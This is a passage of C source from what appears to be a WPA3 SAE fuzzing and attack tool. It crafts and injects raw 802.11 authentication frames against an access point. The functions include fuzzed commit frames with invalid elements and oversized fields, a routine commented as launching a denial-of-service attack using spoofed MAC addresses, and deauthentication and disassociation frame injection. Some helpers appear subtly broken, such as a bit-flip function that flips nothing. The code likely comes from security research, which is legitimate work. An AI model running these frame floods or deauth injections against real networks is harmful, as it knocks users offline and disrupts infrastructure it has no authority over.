 */

static void enable_all_fuzzing_tests(struct state *state)
{
  for (int i = 0; i < NUM_FUZZING_TESTS; i++)
  {
    state->fuzzing_tests[i] = 'e';
  }
  state->retransmission_enabled = 0;
}

static int enable_fuzzing_test(struct state *state, unsigned int test_identifier)
{
  if (test_identifier >= NUM_FUZZING_TESTS)
  {
    return false;
  }
  state->fuzzing_tests[test_identifier] = 'e';
  state->retransmission_enabled = 0;
  return true;
}

static int all_tests_done(struct state *state)
{
  for (int i = 0; i < NUM_FUZZING_TESTS; i++)
  {
    if (state->fuzzing_tests[i] != 'f' && state->fuzzing_tests[i] != '-')
    {
      return false;
    }
  }
  return true;
}

/*
 * If there is currently no other fuzzing test performing, set the
 * state of test identified by test_identifier to 'd'
 */
static int test_enabled(struct state *state, int test_identifier)
{
  // check if we currently are performing a fuzzing test.
  // wait until we reset the state by sending a deauth request to the AP
  // to reset all state.
  if (strchr((const char *)state->fuzzing_tests, 'd') != NULL)
  {
    return false;
  }

  if (state->fuzzing_tests[test_identifier] == 'e')
  {
    state->fuzzing_tests[test_identifier] = 'd';
    state->sae_state = STATE_FUZZING_DONE;
    return true;
  }
  else
  {
    return false;
  }
}

static int set_test_finished(struct state *state)
{
  char *performing_test = strchr((const char *)state->fuzzing_tests, 'd');

  if (performing_test == NULL)
  {
    debug(state, 0, "[!] Fuzzing test does not exist! %s\n", state->fuzzing_tests);
    return false;
  }

  debug(state, 0, "[i] Setting fuzzing test %d as finished\n\n", (unsigned char *)performing_test - state->fuzzing_tests);
  performing_test[0] = 'f';
  debug(state, 0, "[i] fuzzing state string = %s\n", state->fuzzing_tests);
  return all_tests_done(state);
}

/*
 * End fuzzing management functions.
 * -------------------------
 */

/*
 * -------------------------
 * Start fuzzing data generation functions.
 */

static void random_bitflip(unsigned char *buf, int len)
{
  // get random byte in range 0..(len-1)
  int num = rand() % len;

  // get the first bit of the random byte
  int bit = (buf[num] >> 0) & 1;

  if (bit == 1)
  {
    buf[num] |= 1;
  }
  else
  {
    buf[num] |= 0;
  }
}

int randrange(int min, int max)
{
  return min + rand() / (RAND_MAX / (max - min + 1) + 1);
}

static void random_bytes(unsigned char *buf, int len)
{
  for (size_t i = 0; i < len; i++)
  {
    buf[i] = rand();
  }
}

static int random_bytes_random_len(unsigned char *buf, int min_length, int max_length)
{
  size_t random_length = randrange(min_length, max_length);
  random_bytes(buf, random_length);
  return random_length;
}

/*
 * End fuzzing data generation functions.
 * -------------------------
 */

static void randomize_mac(unsigned char *buf)
{
  unsigned char random_mac[6];

  for (int i = 0; i <= 5; i++)
  {
    random_mac[i] = (char)(rand() % 255);
  }

  memcpy(buf + 10, random_mac, 6);
}

/**
 * Setup an auth commit frame.
 *
 * @param state
 * @param buf
 * @param pos
 * @param randomize_mac whether to randomize the src MAC address
 *
 * @return the current position in the frame
 */
static unsigned char *setup_auth_commit_frame(struct state *state, unsigned char *buf, unsigned char *pos)
{
  memcpy(buf, AUTH_REQ_SAE_COMMIT_HEADER, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
  pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;

  memcpy(buf + 4, state->bssid, 6);
  memcpy(buf + 10, state->srcaddr, 6);
  memcpy(buf + 16, state->bssid, 6);

  if (state->randomize_mac)
  {
    randomize_mac(buf);
  }

  /* fill in the correct group id */
  buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = state->groupid;

  return pos;
}

static void inject_fuzzed_sae_commit(struct state *state, const uint8_t *token, int token_len)
{
  int num_bytes = BN_num_bytes(state->prime);
  unsigned char buf[512];
  uint8_t *pos = NULL;
  pos = setup_auth_commit_frame(state, buf, pos);

  if (test_enabled(state, FUZZ_COMMIT_RANDOM_GROUP))
  {
    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = (char)(rand() % 255);
    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 1] = (char)(rand() % 255);
    debug(state, 0, "[FUZZ] Picking random group in commit frame: 0x%x 0x%x\n",
          buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2],
          buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 1]);
  }

  /* token comes after status and group id, before own_scalar and own_element */
  if (token != NULL)
  {
    assert(pos - buf == 24 + 8);
    memcpy(pos, token, token_len);
    pos += token_len;
  }

  if (test_enabled(state, FUZZ_COMMIT_RANDOM_TOKEN))
  {
    unsigned char random_token[SHA256_MAC_LEN];
    random_bytes(random_token, SHA256_MAC_LEN);

    if (token != NULL)
    {
      pos -= token_len;
    }

    memcpy(pos, random_token, SHA256_MAC_LEN);
    debug(state, 0, "[FUZZ] Including random anti clogging token in commit frame\n");

    pos += SHA256_MAC_LEN;
  }

  /* next is the random own_scalar */
  if (test_enabled(state, FUZZ_COMMIT_RANDOM_SCALAR))
  {
    debug(state, 0, "[FUZZ] Choosing random own_scalar\n");
    BN_rand_range(state->own_scalar, state->order);
  }

  bignum2bin(state->own_scalar, pos, num_bytes);
  pos += num_bytes;

  BIGNUM *bignum_x = BN_new();
  BIGNUM *bignum_y = BN_new();

  EC_POINT_get_affine_coordinates_GFp(state->group, state->own_element, bignum_x, bignum_y, state->bnctx);

  if (test_enabled(state, FUZZ_COMMIT_INVALID_ELEMENT))
  {
    debug(state, 0, "[FUZZ] Picking invalid peer Element\n");

    size_t bufsize = BN_num_bytes(state->prime);
    unsigned char randombuf[bufsize];

    // just stuff random data into the bignum
    // Fuzz Test Expected: AP should check that the peer element is
    // actually on the curve
    random_bytes(randombuf, bufsize);
    BN_bin2bn(randombuf, bufsize, bignum_x);
    random_bytes(randombuf, bufsize);
    BN_bin2bn(randombuf, bufsize, bignum_y);
  }

  if (test_enabled(state, FUZZ_COMMIT_ZERO_ELEMENT))
  {
    debug(state, 0, "[FUZZ] Picking zero bytes as peer Element\n");

    size_t bufsize = BN_num_bytes(state->prime);
    unsigned char randombuf[bufsize];
    memset(randombuf, 0, bufsize);

    // just stuff zero bytes into peer element
    // Fuzz Test Expected: AP should check that the peer element is
    // actually on the curve
    BN_bin2bn(randombuf, bufsize, bignum_x);
    BN_bin2bn(randombuf, bufsize, bignum_y);

    print_bignum("station", "Fuzzed bignum_x ", bignum_x);
    print_bignum("station", "Fuzzed bignum_y ", bignum_y);
  }

  if (test_enabled(state, FUZZ_COMMIT_RANDOM_ELEMENT))
  {
    debug(state, 0, "[FUZZ] Picking random but valid peer Element\n");

    // Fuzz Test Expected: AP should confirm that peer element is valid.
    // in the end the peer confirm token must mismatch, because the peer Element
    // has no relation to the PWE and peer scalar
    BN_rand_range(bignum_x, state->order);
    BN_rand_range(bignum_y, state->order);
  }

  bignum2bin(bignum_x, pos, num_bytes);
  bignum2bin(bignum_y, pos + num_bytes, num_bytes);

  BN_free(bignum_y);
  BN_free(bignum_x);

  pos += 2 * num_bytes;

  if (test_enabled(state, FUZZ_COMMIT_INVALID_LENGTH))
  {
    debug(state, 0, "[FUZZ] Injecting random bytes at the end of the frame\n");
    // What I learned here: When injecting more than 100 bytes at the end of the frame,
    // the auth-commit frame is normally ignored by hostapd 2.8. When injecting between
    // 10 and 50 random bytes, the message is parsed and the excess data is shown debug msg.

    // just add a random stream of bytes to the end of the frame
    // it doesn't make sense to make the single fields arbitrarily sized,
    // because those fields don't have any length information anyhow.
    pos += random_bytes_random_len(pos, 10, 50);
  }

  if (test_enabled(state, FUZZ_COMMIT_RANDOM_PASSWORD_IE))
  {
    debug(state, 0, "[FUZZ] Injecting random password identifier at the end of the frame\n");

    char pwd_ie[3 + 0xff];
    pwd_ie[0] = (char)255;
    pwd_ie[1] = 0xff;
    pwd_ie[2] = (char)33;

    memset(pwd_ie + 3, 0x41, 0xff);
    memcpy(pos, pwd_ie, 3 + 0xff);
    pos += 3 + 0xff;
  }

  hexdump(state, 1, buf, pos - buf);

  if (card_write(state, buf, pos - buf, NULL) == -1)
    perror("card_write");

  state->sent_commits++;

  debug(state, 0, "[i] " MACSTR " sent SAE AUTH-COMMIT frame\n", MAC2STR(state->srcaddr));
}

static void fuzz_sae_commit_variable_anti_clogging(struct state *state)
{
  int num_bytes = BN_num_bytes(state->prime);
  unsigned char buf[1024];
  uint8_t *pos = NULL;
  pos = setup_auth_commit_frame(state, buf, pos);

  /* token comes after status and group id, before own_scalar and own_element */
  unsigned char random_token[500];

  for (size_t token_len = 0; token_len <= 500; token_len++)
  {

    randomize_mac(buf);

    random_bytes(random_token, 500);
    memcpy(pos, random_token, token_len);
    debug(state, 0, "[FUZZ] Including random anti clogging token with size %ul in commit frame\n", token_len);

    pos += token_len;

    /* next is the random own_scalar */

    bignum2bin(state->own_scalar, pos, num_bytes);
    pos += num_bytes;

    /* then comes the element */

    BIGNUM *bignum_x = BN_new();
    BIGNUM *bignum_y = BN_new();

    EC_POINT_get_affine_coordinates_GFp(state->group, state->own_element, bignum_x, bignum_y, state->bnctx);

    bignum2bin(bignum_x, pos, num_bytes);
    bignum2bin(bignum_y, pos + num_bytes, num_bytes);

    BN_free(bignum_y);
    BN_free(bignum_x);

    pos += 2 * num_bytes;

    if (card_write(state, buf, pos - buf, NULL) == -1)
      perror("card_write");

    state->sent_commits++;

    // reset the pos
    pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
  }
}

static void fuzz_sae_commit_variable_password_identifier(struct state *state)
{
  int num_bytes = BN_num_bytes(state->prime);
  unsigned char buf[1024];
  uint8_t *pos = NULL;
  pos = setup_auth_commit_frame(state, buf, pos);

  /* next is the random own_scalar */

  bignum2bin(state->own_scalar, pos, num_bytes);
  pos += num_bytes;

  /* then comes the element */

  BIGNUM *bignum_x = BN_new();
  BIGNUM *bignum_y = BN_new();

  EC_POINT_get_affine_coordinates_GFp(state->group, state->own_element, bignum_x, bignum_y, state->bnctx);

  bignum2bin(bignum_x, pos, num_bytes);
  bignum2bin(bignum_y, pos + num_bytes, num_bytes);

  BN_free(bignum_y);
  BN_free(bignum_x);

  pos += 2 * num_bytes;

  unsigned char pwd_ie[500];

  /*
    static int sae_is_password_id_elem(const u8 *pos, const u8 *end)
    {
      return end - pos >= 3 &&
        pos[0] == WLAN_EID_EXTENSION &&
        pos[1] >= 1 &&
        end - pos - 2 >= pos[1] &&
        pos[2] == WLAN_EID_EXT_PASSWORD_IDENTIFIER;
    }
   */
  for (size_t identifier_len = 0; identifier_len <= 256 - 2; identifier_len++)
  {

    randomize_mac(buf);

    pwd_ie[0] = (char)255;
    pwd_ie[1] = (char)identifier_len;
    pwd_ie[2] = (char)33;

    random_bytes(pwd_ie + 3, identifier_len);
    memcpy(pos, pwd_ie, identifier_len);

    debug(state, 0, "[FUZZ] Including random password identifier with length %u at the end of the frame\n", identifier_len);

    pos += identifier_len;

    if (card_write(state, buf, pos - buf, NULL) == -1)
      perror("card_write");

    state->sent_commits++;

    // reset the pos
    pos -= identifier_len;
  }
}

/*
 * Tries to iterate through first 1000 status codes
 * and use valid group id, scalar and element and append
 * random sized data after element.
 */
static void fuzz_sae_commit_status_codes(struct state *state)
{
  int num_bytes = BN_num_bytes(state->prime);
  unsigned char buf[1024];
  uint8_t *pos = NULL;
  pos = setup_auth_commit_frame(state, buf, pos);

  /* next is the random own_scalar */

  bignum2bin(state->own_scalar, pos, num_bytes);
  pos += num_bytes;

  /* then comes the element */

  BIGNUM *bignum_x = BN_new();
  BIGNUM *bignum_y = BN_new();

  EC_POINT_get_affine_coordinates_GFp(state->group, state->own_element, bignum_x, bignum_y, state->bnctx);

  bignum2bin(bignum_x, pos, num_bytes);
  bignum2bin(bignum_y, pos + num_bytes, num_bytes);

  BN_free(bignum_y);
  BN_free(bignum_x);

  pos += 2 * num_bytes;

  unsigned char blob[500];
  size_t rand_size = 0;

  for (size_t status_code = 0; status_code <= 1000; status_code++)
  {

    randomize_mac(buf);

    l_put_le16(status_code, buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 4);

    random_bytes(blob, 500);
    rand_size = randrange(0, 500);
    memcpy(pos, blob, rand_size);

    debug(state, 0, "[FUZZ] Status code = %u, random data length = %u\n", status_code, rand_size);

    pos += rand_size;

    if (card_write(state, buf, pos - buf, NULL) == -1)
      perror("card_write");

    state->sent_commits++;

    // reset the pos
    pos -= rand_size;
  }
}

/**
 *
 * Launch a denial of service attack against access point
 *
 * spoof mac address, create random scalar and token
 * reply immediately when getting reflected auth-commit with anti-clogging token
 * set
 *
 * @param state
 */
static void dos_commit(struct state *state)
{
  int num_bytes = BN_num_bytes(state->prime);
  unsigned char buf[512];
  uint8_t *pos = NULL;
  pos = setup_auth_commit_frame(state, buf, pos);

  /* generate random own scalar */

  BIGNUM *random_scalar = BN_new();
  BN_pseudo_rand(random_scalar, BN_num_bits(state->order) - 1, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
  bignum2bin(random_scalar, pos, num_bytes);
  pos += num_bytes;

  /* then comes the element */

  BIGNUM *bignum_x = BN_new();
  BIGNUM *bignum_y = BN_new();

  BN_pseudo_rand(bignum_x, BN_num_bits(state->order) - 1, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
  BN_pseudo_rand(bignum_y, BN_num_bits(state->order) - 1, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
  EC_POINT_get_affine_coordinates_GFp(state->group, state->own_element, bignum_x, bignum_y, state->bnctx);

  bignum2bin(bignum_x, pos, num_bytes);
  bignum2bin(bignum_y, pos + num_bytes, num_bytes);

  BN_free(bignum_y);
  BN_free(bignum_x);

  pos += 2 * num_bytes;

  randomize_mac(buf);

  if (card_write(state, buf, pos - buf, NULL) == -1)
    perror("card_write");

  state->sent_commits++;
}

static int inject_fuzzed_sae_confirm(struct state *state, int fuzz_type)
{
  unsigned char buf[512];
  uint8_t frame_len = 0;

  memcpy(buf, AUTH_REQ_SAE_CONFIRM_HEADER, AUTH_REQ_SAE_CONFIRM_HEADER_SIZE);
  frame_len += AUTH_REQ_SAE_CONFIRM_HEADER_SIZE;

  memcpy(buf + 4, state->bssid, 6);
  memcpy(buf + 10, state->srcaddr, 6);
  memcpy(buf + 16, state->bssid, 6);

  /* fill in the correct confirm token */
  memcpy(buf + AUTH_REQ_SAE_CONFIRM_HEADER_SIZE, state->confirm_token, SHA256_MAC_LEN);
  frame_len += SHA256_MAC_LEN;

  if (card_write(state, buf, frame_len, NULL) == -1)
    perror("card_write");

  debug(state, 0, "[i] " MACSTR " sent SAE AUTH-CONFIRM frame\n", MAC2STR(state->srcaddr));
  debug(state, 1, "Confirm Frame: \n");
  hexdump(state, 1, buf, frame_len);

  return 0;
}

/*
 * https://www.shellvoide.com/python/forge-and-transmit-de-authentication-packets-over-the-air-in-scapy/
 *
 * Deauthentication Reason
 *
  0	Reserved
  1	Unspecified Reason
  2	Previous authentication is no longer valid
  3	STA is leaving or has left
  4	Dissociated due to inactivity
  5	AP is unable to cope with all associated STAs.
  6	Class 2 Frame received from nonauthenticated STA
  7	Class 3 Frame received from nonassociated STA
  8	Because sending STA is leaving
  9	STA request is not authenticated with responding STA
  10	Because Information in the Power Capability element is unacceptable.

  >>> pkt = RadioTap() / Dot11(addr1="c8:f7:33:d4:5a:e9", addr2="9c:ef:d5:fc:0e:a8", addr3="9c:ef:d5:fc:0e:a8") / Dot11Deauth(reason=2)
  >>> wireshark(pkt)

 */
static int send_deauth_frame(struct state *state)
{
  unsigned char buf[DEAUTH_FRAME_SIZE];

  memset(buf, 0, DEAUTH_FRAME_SIZE);
  memcpy(buf, DEAUTH_FRAME, DEAUTH_FRAME_SIZE);

  memcpy(buf + 4, state->srcaddr, 6); // addr1: address of the station to be deauthenticated
  memcpy(buf + 10, state->bssid, 6);  // set transmitter address to ap
  memcpy(buf + 16, state->bssid, 6);  // set BSSID to ap

  memset(buf + 22, 0, 2); // set sequence number to 0

  memcpy(buf + 24, "\x01\x00", 2); // set reason code to 1

  debug(state, 1, "Deauth Frame: \n");
  hexdump(state, 1, buf, DEAUTH_FRAME_SIZE);

  if (card_write(state, buf, DEAUTH_FRAME_SIZE, NULL) == -1)
    perror("card_write");

  debug(state, 0, "[i] Sent DEAUTH from " MACSTR " to " MACSTR "\n", MAC2STR(state->srcaddr), MAC2STR(state->bssid));

  return 0;
}

static int send_disassoc_frame(struct state *state)
{
  unsigned char buf[DISASSOCIATION_FRAME_SIZE];

  memset(buf, 0, DISASSOCIATION_FRAME_SIZE);
  memcpy(buf, DISASSOCIATION_FRAME, DISASSOCIATION_FRAME_SIZE);

  memcpy(buf + 4, state->srcaddr, 6); // addr1: address of the station to be disassociated
  memcpy(buf + 10, state->bssid, 6);  // set transmitter address to ap
  memcpy(buf + 16, state->bssid, 6);  // set BSSID to ap

  memset(buf + 22, 0, 2); // set sequence number to 0

  memcpy(buf + 24, "\x08\x00", 2); // set reason code to 8: STA is leaving

  debug(state, 1, "Disassoc Frame: \n");
  hexdump(state, 1, buf, DISASSOCIATION_FRAME_SIZE);

  if (card_write(state, buf, DISASSOCIATION_FRAME_SIZE, NULL) == -1)
    perror("card_write");

  debug(state, 0, "[i] Sent DISASSOC from " MACSTR " to " MACSTR "\n", MAC2STR(state->srcaddr), MAC2STR(state->bssid));

  return 0;
}

static int send_ack_frame(struct state *state)
{

  if (SEND_ACK)
  {
    unsigned char buf[10];

    memset(buf, 0, sizeof(buf));
    memcpy(buf, ACK_FRAME, sizeof(ACK_FRAME) - 1);

    // https://stackoverflow.com/questions/37040303/why-do-802-11-acknowledgement-frames-have-no-source-mac
    // ack frames have only a destination MAC address

    // memcpy(buf + 4, state->bssid, 6);

    if (card_write(state, buf, 10, NULL) == -1)
      perror("card_write");

    debug(state, 0, "[i] Sent ACK frame from " MACSTR " to " MACSTR "\n", MAC2STR(state->srcaddr),
          MAC2STR(state->bssid));
    hexdump(state, 1, buf, 10);

    return 0;
  }
}

/*
 * must contain the cipher that is advertised in the beacon frames
 */
static int send_association_request(struct state *state)
{
  unsigned char buf[200];

  memset(buf, 0, sizeof(buf));
  memcpy(buf, ASSOC_REQ2, sizeof(ASSOC_REQ2) - 1);

  // ap is destination/receiver
  memcpy(buf + 4, state->bssid, 6);

  // insert our src/transmitter address
  memcpy(buf + 10, state->srcaddr, 6);

  // insert bssid as last mac address
  memcpy(buf + 16, state->bssid, 6);

  // set the sequence number to zero
  memset(buf + 22, 0, 2);

  // insert capability information from Beacon frames
  memcpy(buf + 24, state->ap_capability_information, 2);

  // copy relevant tagged params from Beacon frames
  memcpy(buf + 28, state->ap_tagged_params_from_beacon_for_assoc, 62);

  // and copy manually supported operating classes because it's not in the beacon
  // frames. maybe in probe response frames???
  const char *supported_operating_classes_ie = "\x3b\x11\x51\x51\x53\x54\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f";

  memcpy(buf + 90, supported_operating_classes_ie, 19);

  memset(buf + 109, 0, sizeof(buf) - 109);

  debug(state, 1, "ASSOC Frame: \n");
  hexdump(state, 1, buf, 109);

  if (card_write(state, buf, 109, NULL) == -1)
    perror("card_write");

  debug(state, 0, "[i] " MACSTR " sent ASSOCIATION request frame\n", MAC2STR(state->srcaddr));

  return 0;
}

// processes commit frame and derives all keys
static int sae_process_commit(struct state *state)
{
  /*
   * K = own_scalar-op(rand, (elem-op(own_scalar-op(peer-commit-own_scalar, PWE),
   *                                        PEER-COMMIT-ELEMENT)))
   * If K is identity own_element (point-at-infinity), reject
   * k = F(K) (= x coordinate)
   */

  // int EC_POINT_mul(const EC_GROUP *group, EC_POINT *r, const BIGNUM *n, const EC_POINT *q, const BIGNUM *m, BN_CTX *ctx);
  // EC_POINT_mul calculates the value generator * n + q * m and stores the result in r.
  // The value n may be NULL in which case the result is just q * m.

  // int EC_POINT_add(const EC_GROUP *group, EC_POINT *r, const EC_POINT *a, const EC_POINT *b, BN_CTX *ctx);
  // EC_POINT_add adds the two points a and b and places the result in r.

  debug(state, 0, "[i] Processing commit frame from " MACSTR "!\n", MAC2STR(state->bssid));

  /*
   * validate the scalar...
   */
  if ((BN_cmp(state->peer_scalar, BN_value_one()) < 1) ||
      (BN_cmp(state->peer_scalar, state->order) > 0))
  {
    fprintf(stderr, "peer's scalar is invalid!\n");
    goto fail;
  }

  /*
   * ...and the element
   */
  if (!EC_POINT_is_on_curve(state->group, state->peer_element, state->bnctx))
  {
    fprintf(stderr, "peer's element is invalid!\n");
    goto fail;
  }

  if (EC_POINT_mul(state->group, state->K, NULL, state->PWE, state->peer_scalar, state->bnctx) == 0 || // now compute: scalar * PWE...
      EC_POINT_add(state->group, state->K, state->K, state->peer_element, state->bnctx) == 0 ||
      EC_POINT_mul(state->group, state->K, NULL, state->K, state->private_val, state->bnctx) == 0 ||
      EC_POINT_is_at_infinity(state->group, state->K) ||
      EC_POINT_is_on_curve(state->group, state->K, state->bnctx) != 1 ||
      EC_POINT_get_affine_coordinates_GFp(state->group, state->K, state->k, NULL, state->bnctx) == 0)
  {
    printf("Failed to compute K and k\n");
  }
  else
  {
    if (state->debug_level > 0)
    {
      print_EC_POINT(state, state->K, "K:");
    }
  }

  unsigned char k[SHA256_DIGEST_LENGTH];
  unsigned char null_key[SHA256_DIGEST_LENGTH], val[SAE_MAX_PRIME_LEN];
  unsigned char keyseed[SHA256_MAC_LEN];
  unsigned char keys[(SHA256_DIGEST_LENGTH * 2) * 8];
  HMAC_CTX *ctx = HMAC_CTX_new();

  memset(k, 0, BN_num_bytes(state->prime));
  int offset = BN_num_bytes(state->prime) - BN_num_bytes(state->k);
  BN_bn2bin(state->k, k + offset);

  /* keyseed = H(<0>32, k)
   * KCK || PMK = KDF-512(keyseed, "SAE KCK and PMK",
   *                      (commit-own_scalar + peer-commit-own_scalar) modulo r)
   * PMKID = L((commit-own_scalar + peer-commit-own_scalar) modulo r, 0, 128)
   */

  memset(null_key, 0, sizeof(null_key));
  memset(keyseed, 0, sizeof(keyseed));

  /*
   * first extract the entropy from k into keyseed...
   */
  HMAC_Init_ex(ctx, null_key, SHA256_DIGEST_LENGTH, EVP_sha256(), NULL);
  HMAC_Update(ctx, k, BN_num_bytes(state->prime));
  HMAC_Final(ctx, keyseed, &function_mdlen);

  HMAC_CTX_free(ctx);

  debug(state, 1, "SAE: keyseed\n");
  hexdump(state, 1, keyseed, SHA256_MAC_LEN);

  BIGNUM *nsum;
  unsigned char *tmp;

  if (((tmp = (unsigned char *)malloc(BN_num_bytes(state->order))) == NULL) ||
      ((nsum = BN_new()) == NULL))
  {
    fprintf(stderr, "unable to create buf/bignum to sum scalars!\n");
    goto fail;
  }

  BN_add(nsum, state->own_scalar, state->peer_scalar);
  BN_mod(nsum, nsum, state->order, state->bnctx);
  memset(tmp, 0, BN_num_bytes(state->order));
  offset = BN_num_bytes(state->order) - BN_num_bytes(nsum);
  BN_bn2bin(nsum, tmp + offset);

  memcpy(state->pmkid, tmp, SAE_PMKID_LEN);
  debug(state, 1, "SAE: PMKID\n");
  hexdump(state, 1, state->pmkid, SAE_PMKID_LEN);

  // use this KDF from openssl: https://github.com/openssl/openssl/blob/master/crypto/kdf/sskdf.c
  // DOC: https://www.openssl.org/docs/manmaster/man3/EVP_KDF_derive.html
  // example:

  if (prf(keyseed, SHA256_DIGEST_LENGTH,
          (unsigned char *)"SAE KCK and PMK", strlen("SAE KCK and PMK"),
          tmp, BN_num_bytes(state->order),
          keys, ((SHA256_DIGEST_LENGTH * 2) * 8)) < 0)
  {
    fprintf(stderr, "prf() in process commit!\n");
    goto fail;
  }
  free(tmp);
  BN_free(nsum);

  memset(keyseed, 0, sizeof(keyseed));
  memcpy(state->kck, keys, SAE_KCK_LEN);
  memcpy(state->pmk, keys + SAE_KCK_LEN, SAE_PMK_LEN);
  memcpy(state->pmkid, val, SAE_PMKID_LEN);
  memset(keys, 0, sizeof(keys));

  debug(state, 1, "SAE: KCK\n");
  hexdump(state, 1, state->kck, SAE_KCK_LEN);

  debug(state, 1, "SAE: PMK\n");
  hexdump(state, 1, state->pmk, SAE_PMK_LEN);

  return 0;

fail:
  return -1;
}

/*
 * TODO: we can rewrite this function much prettier
 * state - the state
 * build_for_peer - build the confirm token for the peer. Used to verify it.
 */
static int build_confirm_token(struct state *state, int build_for_peer)
{
  /*
     The Commit Exchange consists of an exchange of data that is the
     output of the random function, H(), the key confirmation key, and the
     two scalars and two elements exchanged in the Commit Exchange.  The
     order of the scalars and elements are: scalars before elements, and
     sender's value before recipient's value.  So from each peer's
     perspective, it would generate:

                  confirm = H(kck | own_scalar | peer-own_scalar |
                              Element | Peer-Element | <sender-id>)
   */

  /* From wpa_supplicant 2.8 :
   * Confirm
   * CN(key, X, Y, Z, ...) =
   *    HMAC-SHA256(key, D2OS(X) || D2OS(Y) || D2OS(Z) | ...)
   * confirm = CN(KCK, send-confirm, commit-own_scalar, COMMIT-ELEMENT,
   *              peer-commit-own_scalar, PEER-COMMIT-ELEMENT)
   * verifier = CN(KCK, peer-send-confirm, peer-commit-own_scalar,
   *               PEER-COMMIT-ELEMENT, commit-own_scalar, COMMIT-ELEMENT)
   */

  debug(state, 1, "[i] Building confirm token %s\n", build_for_peer == 1 ? "for peer" : "for station");

  unsigned char buf[SHA256_MAC_LEN];
  unsigned int buf_length = SHA256_MAC_LEN;
  HMAC_CTX *ctx;

  if ((ctx = HMAC_CTX_new()) == NULL)
  {
    return -1;
  }

  debug(state, 1, "Send confirm=%d\n", state->send_confirm);

  /* Send-Confirm */
  unsigned char sc[2];
  memcpy(sc, (unsigned char *)&(state->send_confirm), sizeof(short));

  // TODO: Find out why the peer confirm token use 0xffff as send confirm number
  if (build_for_peer)
  {
    memcpy(sc, (unsigned char *)&state->peer_send_confirm, sizeof(short));
  }

  if (state->send_confirm < 0xffff)
    state->send_confirm++;

  HMAC_Init_ex(ctx, state->kck, SHA256_DIGEST_LENGTH, EVP_sha256(), NULL);

  if (HMAC_Update(ctx, sc, sizeof(short)) == 0)
    return -1;

  unsigned char tmp[128];
  memset(tmp, 0, sizeof(tmp));
  int offset = BN_num_bytes(state->order) - BN_num_bytes(state->own_scalar);

  if (build_for_peer)
  {
    /* peer's scalar */
    memset(tmp, 0, sizeof(tmp));
    offset = BN_num_bytes(state->order) - BN_num_bytes(state->peer_scalar);
    BN_bn2bin(state->peer_scalar, tmp + offset);

    if (HMAC_Update(ctx, tmp, BN_num_bytes(state->prime)) == 0)
      return -1;

    /* peer's element */
    memset(tmp, 0, sizeof(tmp));
    ecc_point2bin(state, state->peer_element, tmp);
    if (HMAC_Update(ctx, tmp, 2 * BN_num_bytes(state->prime)) == 0)
      return -1;

    /* my scalar */
    memset(tmp, 0, sizeof(tmp));
    BN_bn2bin(state->own_scalar, tmp + offset);

    if (HMAC_Update(ctx, tmp, BN_num_bytes(state->order)) == 0)
      return -1;

    /* own element */
    memset(tmp, 0, sizeof(tmp));
    ecc_point2bin(state, state->own_element, tmp);
    if (HMAC_Update(ctx, tmp, 2 * BN_num_bytes(state->prime)) == 0)
      return -1;
  }
  else
  {

    /* my scalar */
    memset(tmp, 0, sizeof(tmp));
    BN_bn2bin(state->own_scalar, tmp + offset);

    if (HMAC_Update(ctx, tmp, BN_num_bytes(state->order)) == 0)
      return -1;

    /* own element */
    memset(tmp, 0, sizeof(tmp));
    ecc_point2bin(state, state->own_element, tmp);
    if (HMAC_Update(ctx, tmp, 2 * BN_num_bytes(state->prime)) == 0)
      return -1;

    /* peer's scalar */
    memset(tmp, 0, sizeof(tmp));
    offset = BN_num_bytes(state->order) - BN_num_bytes(state->peer_scalar);
    BN_bn2bin(state->peer_scalar, tmp + offset);

    if (HMAC_Update(ctx, tmp, BN_num_bytes(state->prime)) == 0)
      return -1;

    /* peer's element */
    memset(tmp, 0, sizeof(tmp));
    ecc_point2bin(state, state->peer_element, tmp);
    if (HMAC_Update(ctx, tmp, 2 * BN_num_bytes(state->prime)) == 0)
      return -1;
  }

  HMAC_Final(ctx, buf, &buf_length);
  HMAC_CTX_free(ctx);

  if (build_for_peer)
  {
    memcpy(state->peer_confirm_token, buf, SHA256_MAC_LEN);
    debug(state, 1, "Computed Peer Confirm token: \n");
    hexdump(state, 1, state->peer_confirm_token, SHA256_MAC_LEN);
  }
  else
  {
    memcpy(state->confirm_token, buf, SHA256_MAC_LEN);
    debug(state, 1, "Computed Confirm token: \n");
    hexdump(state, 1, state->confirm_token, SHA256_MAC_LEN);
  }

  return 0;
}

/*
 * See the meaning of the frame contents here:
 * https://www.oreilly.com/library/view/80211-wireless-networks/0596100523/ch04.html
 */
static void process_beacon_frame(struct state *state, unsigned char *buf, int len)
{
  state->rx_beacons++;
  debug(state, 2, "[i] Beacon frame received!\n");

  if (state->first_beacon.tv_nsec == 0 && state->first_beacon.tv_sec == 0)
  {
    struct timespec now = {0, 0};
    clock_gettime(CLOCK_MONOTONIC, &now);
    state->first_beacon.tv_nsec = now.tv_nsec;
    state->first_beacon.tv_sec = now.tv_sec;
  }

  if (state->beacon_processed == 1)
    return;

  debug(state, 1, "Processing beacon frame with size %d\n", len);
  hexdump(state, 1, buf, len);

  // after 24 bytes the fixed parameters begin
  // fixed params: (Timestamp(8 bytes), Beacon Interval (2 Bytes), Capabilities Information (2 Bytes)

  memcpy(state->ap_capability_information, (buf + 34), 2);

  // then we have the tagged parameters starting at (buf+36)
  // the first tagged parameter is the SSID(0x0),
  // the name is 'WPA3-Network' and this are a total of 14 bytes
  // [offset 50] then we have supported rates with a total of 10 bytes and 8 rates
  // [offset 60] then we have DS paramter set with a total of 3 bytes
  // [offset 63] then we have traffic indication map with a total of 6 bytes
  // [offset 69] then we have ERP information with a total of 3 bytes
  // [offset 72] then we have extended supported rates with a total of 6 bytes 32 04 30 48 60 6C

  // [offset 78] at the end we have RSN Information Element (0x30) with a length of 20 (0x14) bytes
